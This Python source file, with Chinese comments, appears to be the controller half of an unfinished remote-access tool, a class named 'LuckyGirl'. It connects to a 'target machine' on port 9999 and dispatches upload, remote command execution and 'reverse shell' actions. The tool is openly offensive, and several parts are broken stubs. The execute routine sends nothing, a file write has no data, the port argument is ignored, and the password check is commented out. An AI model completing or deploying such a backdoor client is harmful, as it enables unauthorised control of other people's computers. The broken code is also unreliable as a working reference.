# 和服务器相关的操作

import socket
import sys


class LuckyGirl:
    """Lucky Girl
    """
    def __init__(self,ip,port) -> None:
        self.ip = ip
        self.port = 9999
        self.passport = 1234
        self.choose = {
            'upload':self.upload,
            'execute':self.execute_command,
            'shell':self.open_shell
        }
        self.show()
    
    def show(self):
        print(f"ip = {self.ip}")
        print(f"port = {self.port}")
        print(self.choose)
    def upload(self,msg):
        """上传文件
        Args:
            msg (list): 由源地址和目标地址组成的列表
        """
   
        src_path = msg[0]
        dst_path = msg[1]
        file_buffer = ""
        # print(f"src = {src_path}")
        # print(f"dst = {dst_path}")
        
        if(len(src_path)):
            try:
                with open(src_path,'r') as f:
                    file_buffer = f.read()
                    f.close()
                
                # 装包 ['命令',[内容]]
                packet = ['upload']
                data = [dst_path,file_buffer]
                packet.append(data)
                print(str(packet))
                self.direct_send(packet)
                
                #self.socket.send(file_buffer)
                return True
                    
            except Exception as e:
                print(e)
        
        return False
    def execute_command(self,msg):
        """直接执行对应的系列命令,然后接收or不接收结果 要么直接执行文件内容的命令 这里以直接单行

        Args:
            msg (list): [type,save_path,command],type:0 or 1,0为不接受结果,1为接收返回结果
        """
        flag = False
        command_type = msg[0]
        if command_type == 0:
            command = msg[1]
        else:
            save_path = msg[1]
            command = msg[2]
            flag = True
        
        #发送数据 ...
        
        
        
        # 保存返回结果
        if flag:
            try:
                with open(save_path,'wb') as f:
                    f.write()
                    f.close()
            except Exception as e:
                print(e)
            
    def open_shell(self,msg):
        """打开反弹shell

        Args:
            msg (list): ['shell','type']第二个参数为样式
        """
        shell_type = msg[1]
        
        #发送命令
        output = self.direct_send(msg)
        
        #shell交互
        buffer = sys.stdin.read()
        self.socket.send(buffer.encode())
        

    
    def connect_server(self):
        """连接目标机器，且进行初始化操作,获得socket

        """
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.socket.connect((self.ip,self.port))
            #对密码
            #self.socket.send(self.passport)
           
        except Exception as e:
            print("[*] Exception ! Exiting.")
            print(e)
    
    def direct_send(self,msg):
        """将list数据转换成能够直接发送的数据,并且发送

        Args:
            msg (list): _description_
        """
        try:
            data = str(msg).encode()
            self.socket.send(data)
            return True
        except Exception as e:
            print(e)
            
        return False
   
    
    def send_msg(self,type,msg):
        
        print (f"type = {type}")
        print (f"msg = {msg}")
        # 执行对应的命令 从字典选取对应的type的func，然后第二个参数的传递的信息
        try:
            out = self.choose[type](msg)
        except Exception as e:
            print(e)
        
        # self.disconnet_server()
    
    def disconnet_server(self):
        self.socket.close()


if __name__ == "__main__":
    a = LuckyGirl('127.0.0.1','9999')
    a.connect_server()
    a.send_msg('upload',['test.txt','save2.txt'])
    #a.choose['upload']()
